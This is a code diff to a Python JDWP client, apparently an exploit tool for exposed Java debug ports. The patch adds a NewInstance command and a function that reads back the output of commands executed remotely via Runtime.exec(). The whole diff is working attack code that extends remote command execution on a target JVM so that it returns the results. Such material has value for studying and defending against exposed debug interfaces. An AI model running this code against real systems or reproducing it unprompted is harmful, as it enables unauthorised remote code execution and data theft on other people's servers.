@@ -52,6 +52,8 @@ EVENTSET_SIG              = (15, 1)
 EVENTCLEAR_SIG            = (15, 2)
 EVENTCLEARALL_SIG         = (15, 3)
 
+NEWINSTANCE_SIG = (3, 4)
+
 # Other codes
 MODKIND_COUNT             = 1
 MODKIND_THREADONLY        = 2
@@ -199,6 +201,7 @@ class JDWPClient:
         return
 
     def getversion(self):
+        # VERSION_SIG = (1, 1)
         self.socket.sendall( self.create_packet(VERSION_SIG) )
         buf = self.read_reply()
         formats = [ ('S', "description"), ('I', "jdwpMajor"), ('I', "jdwpMinor"),
@@ -213,6 +216,7 @@ class JDWPClient:
         return "%s - %s" % (self.vmName, self.vmVersion)
 
     def idsizes(self):
+        # IDSIZES_SIG = (1, 7)
         self.socket.sendall( self.create_packet(IDSIZES_SIG) )
         buf = self.read_reply()
         formats = [ ("I", "fieldIDSize"), ("I", "methodIDSize"), ("I", "objectIDSize"),
@@ -247,6 +251,7 @@ class JDWPClient:
         try:
             getattr(self, "classes")
         except:
+            # ALLCLASSES_SIG = (1, 3)
             self.socket.sendall( self.create_packet(ALLCLASSES_SIG) )
             buf = self.read_reply()
             formats = [ ('C', "refTypeTag"),
@@ -280,6 +285,12 @@ class JDWPClient:
             for entry in self.methods[refId]:
                 if entry["name"].lower() == name.lower() :
                     return entry
+        return None
+
+    def get_method_by_signature(self, refTypeId, signature):
+        for method in self.methods[refTypeId]:
+            if method['signature'] == signature:
+                return method
         return None
 
     def getfields(self, refTypeId):
@@ -337,6 +348,19 @@ class JDWPClient:
         data+= struct.pack(">I", 0)
 
         self.socket.sendall( self.create_packet(INVOKESTATICMETHOD_SIG, data=data) )
+        buf = self.read_reply()
+        return buf
+
+    def newInstance(self, classId, threadId, methId, *args):
+        data = self.format(self.referenceTypeIDSize, classId)
+        data+= self.format(self.objectIDSize, threadId)
+        data+= self.format(self.methodIDSize, methId)
+        data+= struct.pack(">I", len(args))
+        for arg in args:
+            data+= arg
+        data+= struct.pack(">I", 0)
+
+        self.socket.sendall( self.create_packet(NEWINSTANCE_SIG, data=data) )
         buf = self.read_reply()
         return buf
 
@@ -415,7 +439,6 @@ class JDWPClient:
         tId = self.unformat(self.objectIDSize, buf[10:10+self.objectIDSize])
         loc = -1 # don't care
         return rId, tId, loc
-
 
 
 def runtime_exec(jdwp, args):
@@ -597,7 +620,89 @@ def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, comma
         return False
 
     retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
+    if not retId:
+        print ("[-] Runtime.exec() failed! ")
+        return False
+
     print ("[+] Runtime.exec() successful, retId=%x" % retId)
+    echo_command_result(jdwp, threadId, retId)
+    return True
+
+def echo_command_result(jdwp, threadId, retId):
+    processClass = jdwp.get_class_by_name("Ljava/lang/Process;")
+    if processClass is None:
+        print ("[-] Cannot find class Process")
+        return False
+    print ("[+] Found Process class: id=%x" % processClass["refTypeId"])
+
+    jdwp.get_methods(processClass["refTypeId"])
+    getInputStreamMethod = jdwp.get_method_by_name("getInputStream")
+    if getInputStreamMethod is None:
+        print ("[-] Cannot find method Process.getInputStream()")
+        return False
+    print ("[+] Found Process.getInputStream(): id=%x" % getInputStreamMethod["methodId"])
+
+    data = []
+    buf = jdwp.invoke(retId, threadId, processClass["refTypeId"], getInputStreamMethod["methodId"], *data)
+    if buf[0] != chr(TAG_OBJECT):
+        print ("[-] Unexpected returned type: expecting Object")
+        return False
+
+    inputStreamId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
+
+    inputStreamReader = jdwp.get_class_by_name("Ljava/io/InputStreamReader;")
+    jdwp.get_methods(inputStreamReader["refTypeId"])
+
+    inputStreamReaderMethod = jdwp.get_method_by_signature(inputStreamReader["refTypeId"], "(Ljava/io/InputStream;)V")
+    if inputStreamReaderMethod is None:
+        print ("[-] Cannot find InputStreamReader constructor method")
+        return False
+
+    data = [ chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, inputStreamId) ]
+    buf = jdwp.newInstance(inputStreamReader["refTypeId"], threadId, inputStreamReaderMethod["methodId"], *data)
+
+    if buf[0] != chr(TAG_OBJECT):
+        print ("[-] Unexpected returned type: expecting Object")
+        return False
+
+    isrId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
+    print ("[+] InputStreamReader Object Id=%x" % isrId)
+
+    bufferedReader = jdwp.get_class_by_name("Ljava/io/BufferedReader;")
+    jdwp.get_methods(bufferedReader["refTypeId"])
+
+    bufferedReaderMethod = jdwp.get_method_by_signature(bufferedReader["refTypeId"], "(Ljava/io/Reader;)V")
+    if bufferedReaderMethod is None:
+        print ("[-] Cannot find BufferedReader constructor method")
+        return False
+
+    data = [ chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, isrId) ]
+    buf = jdwp.newInstance(bufferedReader["refTypeId"], threadId, bufferedReaderMethod["methodId"], *data)
+
+    if buf[0] != chr(TAG_OBJECT):
+        print ("[-] Unexpected returned type: expecting Object")
+        return False
+
+    brId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
+    print ("[+] bufferedReader Object Id=%x" % brId)
+
+    readlineMethod = jdwp.get_method_by_signature(bufferedReader["refTypeId"], "()Ljava/lang/String;")
+    if readlineMethod is None:
+        print ("[-] Cannot find method BufferedReader.readline()")
+        return False
+    print ("[+] Found readline method Id=%x" % readlineMethod["methodId"])
+
+    print ("[+] Output command execution result start: \n")
+    while True:
+        data = []
+        buf = jdwp.invoke(brId, threadId, bufferedReader["refTypeId"], readlineMethod["methodId"], *data)
+        if buf[0] != chr(TAG_STRING):
+            print ("\n[+] Output command execution result complete.")
+            break
+        else:
+            retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
+            res = jdwp.solve_string(jdwp.format(jdwp.objectIDSize, retId))
+            print ("    %s" % res.decode("utf-8"))
 
     return True
 
